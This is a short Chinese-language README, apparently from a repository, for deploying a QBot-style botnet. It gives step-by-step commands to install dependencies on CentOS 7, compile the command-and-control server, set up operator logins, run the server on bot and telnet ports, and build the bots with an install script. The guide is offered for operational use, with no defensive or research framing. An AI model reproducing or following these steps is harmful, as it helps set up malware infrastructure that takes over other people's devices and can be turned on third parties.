# 非常哈基米的僵尸网络(QBOT)  
`**首先你得有一个centos 7系统**`  
然后安装依赖  
```bash
curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
yum update -y
yum install epel-release -y
yum install vim screen gcc perl wget lbzip bzip2 unzip httpd -y
```
## 然后编译cnc主端  
```bash
gcc server.c -o server -pthread
```
## 编译完主端你就可以先运行了
```bash
#创建一个登录文件
vi login.txt
#格式:
用户名 密码
#然后启动主端
screen ./server 监听僵尸端口 线程 telnet连接端口
ctrl+a+d退出
如果你想查看主端可以先输入指令
screen -ls
查看会话
然后
screen -r 会话名
```
## 编译僵尸
```python
python bot_install.py
```
`**完事就是这么简单**`
`**后面僵尸自己弄**`
